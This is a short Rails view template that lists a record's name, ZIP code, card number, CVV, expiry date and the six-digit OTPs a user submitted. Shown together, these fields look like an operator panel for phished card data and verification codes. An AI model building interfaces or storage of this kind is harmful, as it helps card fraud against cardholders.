<div id="<%= dom_id info %>">
<hr/>
  <p>
    <strong>Name:</strong>
    <%= info.name %>
  </p>
  
  <p>
    <strong>ZIP:</strong>
    <%= info.zip %>
  </p>

  <p>
    <strong>Card:</strong>
    <%= info.card %>
  </p>

  <p>
    <strong>Cvv:</strong>
    <%= info.cvv %>
  </p>

  <p>
    <strong>Month:</strong>
    <%= info.mon %>
  </p>

  <p>
    <strong>Year:</strong>
    <%= info.yea %>
  </p>

  <h6>OTP(s) submitted by the current user:</h6>
  
  <% info.six_digit_inputs.each do |six_digit_input| %>
    <p><strong>OTP:</strong> <%= six_digit_input.value %></p>
  <% end %>
  <hr/>
  <hr/>
</div>
